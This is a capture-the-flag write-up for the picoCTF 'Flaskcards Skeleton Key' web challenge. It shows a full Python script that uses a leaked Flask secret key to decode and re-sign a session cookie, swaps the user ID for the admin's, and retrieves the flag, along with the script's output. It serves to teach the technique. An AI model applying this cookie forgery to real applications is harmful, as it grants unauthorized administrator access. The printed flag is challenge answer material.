# Flaskcards Skeleton Key
Web Exploitation, 600 points

## Description:
> Nice! You found out they were sending the Secret_key: 06f4eefabf03b8f4e521fbdada13f65c. Now, can you find a way to log in as admin? 


## Solution:

We are presented with a Flask-based website which allows us to register and log in.

Upon logging in, we receive a cookie similar to the following:
```
<Cookie session=.eJwlj0FqQzEMRO_idRaSZclWLvORZYmGQAv_J6vSu8fQ5czwhpnfcuQZ11e5v8533MrxWOVeqkfMqWAdMlhgUOhIWNZH68Si3psg6GhO3FIXQXTnCIGVMWVJMEuoqm9ritqYYsp9oTek4QjY55RsdZiQuC3ZRdQ367ys3IpfZx6vn2d87z1ku3PHFUeVigqUgTLD0DQyALYw1rG59xXn_wni8vcB5xI_EA.Dst08g.oFWrLrk8A_EiZx4mX1BH9-qNCx8 for 2018shell3.picoctf.com/>
```

As explained [in this writeup](https://terryvogelsang.tech/MITRECTF2018-my-flask-app/), given the secret key (which was provided in the description), we can decode and/or forge the cookie. [This](https://www.kirsle.net/wizards/flask-session.cgi#source) online tool has some more information as well.

Heavily based on the code provided in both links, the following script will register and sign in to our website, decode the session cookie, replace the user ID to an Admin ID, and login as admin to receive the flag.

The script:
```python
from itsdangerous import URLSafeTimedSerializer, base64_decode
from flask.sessions import session_json_serializer
from hashlib import sha1
from pwn import *
import requests
import json
import zlib
import re

URL = "http://2018shell3.picoctf.com:5953"
SECRET_KEY = '06f4eefabf03b8f4e521fbdada13f65c'
COOKIE_NAME = "session"

class Flaskcards(object):

    def __init__(self, url):
        self.session = requests.Session()
        self.url = url
        self.username = None
        self.password = None

    def Register(self, username, password):
        log.info("Registering with username '{}', password '{}'".format(username, password))
        register_url = "{}/register".format(self.url)
        r = self.session.get(register_url)
        csrf = self._get_csrf(r.text)
        r = self.session.post(register_url, data = {"csrf_token": csrf, 'username': username, 'password': password, 'password2': password})
        assert("Successfully registered" in r.text)
        self.username = username
        self.password = password
        return r
        
        
    def Login(self):
        if self.username is None or self.password is None:
            raise Exception("Must register first!")
        username = self.username
        password = self.password
        log.info("Logging in with username '{}', password '{}'".format(username, password))
        login_url = "{}/login".format(self.url)
        r = self.session.get(login_url)
        csrf = self._get_csrf(r.text)
        r = self.session.post(login_url, data = {"csrf_token": csrf, 'username': username, 'password': password, 'remember_me': "n"})
        assert("Welcome {}!".format(username) in r.text)
        return r
    
    def GetCookie(self, name):
        return self.session.cookies[name]
        
    @staticmethod
    def _get_csrf(text):
        csrf = re.search('input id="csrf_token" name="csrf_token" type="hidden" value="([^"]+)"', text).group(1)
        return csrf
        
    
class FlaskForger(object):
    def __init__(self, secret_key):
        self.signer = URLSafeTimedSerializer(secret_key, salt='cookie-session', serializer=session_json_serializer,
                                        signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1})
    def forgeSession(self, payload):
        gen_payload = self.signer.dumps(payload)
        log.info("Generated signed cookie : {}".format(gen_payload))
        return gen_payload
        
    @classmethod
    def decodeCookiePayload(cls, session):
        start = 1 if session[0] == '.' else 0

        session_payload = session[start:].split('.')[0]
        log.info("Session data: {}".format(session_payload))
        decoded_session_payload = base64_decode(session_payload)
        decompressed_session_payload = zlib.decompress(decoded_session_payload)
        return decompressed_session_payload


flsk = Flaskcards(URL)
flsk.Register(randoms(10), randoms(10))
flsk.Login()
old_cookie_val = flsk.GetCookie(COOKIE_NAME)
log.info("Original cookie: {}".format(old_cookie_val))

forger = FlaskForger(SECRET_KEY)
decoded = FlaskForger.decodeCookiePayload(old_cookie_val)
log.info("Original cookie data: {}".format(decoded))

j = json.loads(decoded)
j["user_id"] = "1"
log.info("New cookie data: {}".format(json.dumps(j)))

new_cookie_val = forger.forgeSession(j)

cookie = {COOKIE_NAME: new_cookie_val}

r = requests.get('{}/admin'.format(URL), cookies=cookie)

for line in r.text.split("\n"):
    if "picoCTF" in line:
        print (line)
```

The output:
```
root@kali:/media/sf_CTFs/pico/Flaskcards_Skeleton_Key/v2# python exploit.py
[*] Registering with username 'ubcazabyng', password 'hhdjfuysxf'
[*] Logging in with username 'ubcazabyng', password 'hhdjfuysxf'
[*] Original cookie: .eJwlj0tqQzEMRfficQZyZMlSNvPQz7QUWngvGZXuPYZOD5z7-W3HOuv6aI_n-apbOz6zPdo9qtwVbMIqYhAslQVpU8ZEYo05uIPKCKSxNBFqBlUx5Crn5CLiUtXYyFlNnE1pZo_RUaJDn-68xl2MkcOSdxDO7QaltVuL61zH8-ervvce7F40HQZKdyDcZWulhdEoSlEx2jBre6-rzv8Tg9rfGwH_P98.Dst6EQ.DsX3j2UFIVVeaPHjTY0zfcrLQkw
[*] Session data: eJwlj0tqQzEMRfficQZyZMlSNvPQz7QUWngvGZXuPYZOD5z7-W3HOuv6aI_n-apbOz6zPdo9qtwVbMIqYhAslQVpU8ZEYo05uIPKCKSxNBFqBlUx5Crn5CLiUtXYyFlNnE1pZo_RUaJDn-68xl2MkcOSdxDO7QaltVuL61zH8-ervvce7F40HQZKdyDcZWulhdEoSlEx2jBre6-rzv8Tg9rfGwH_P98
[*] Original cookie data: {"_fresh":true,"_id":"2ceebb90a70fe56083e98f0da78473569c74610984c354f9d30e7c5ee60dfeb6d6e556e999ce60b69a8b6a957d1c4138c1017bb6f428a636cad635437eb6c5da","csrf_token":"31be57b04381b053e7cffdaca54e5d898a553ede","user_id":"45"}
[*] New cookie data: {"csrf_token": "31be57b04381b053e7cffdaca54e5d898a553ede", "_fresh": true, "user_id": "1", "_id": "2ceebb90a70fe56083e98f0da78473569c74610984c354f9d30e7c5ee60dfeb6d6e556e999ce60b69a8b6a957d1c4138c1017bb6f428a636cad635437eb6c5da"}
[*] Generated signed cookie : .eJwdj0tqQzEMRbdSPM5Aji1ZCmQJHXQFD_1MS6GF95JRyN5jMj1w7udRtrnn8V0ut_2ep7L9RLmUs2eaCeiAmUjALYUnhA7uoyGJj04VhLs37FOiQQ7HTIKYaRSUiJQi4gsZibKRCo6o3mtjr1CHGc1-ZqVGrkErqI3lOoaWU_Fjn9vt_zf_1p5WLXEY9MbVANsqmzPUFXtisLDigpHLux-5v088yoct9fPrei3P5wtOO0KG.Dst6Ew.SsowHM9RmbngCyg9xAjZo6lW8BQ
        <p> Your flag is: picoCTF{1_id_to_rule_them_all_1879a381} </p>
```

The flag: picoCTF{1_id_to_rule_them_all_1879a381}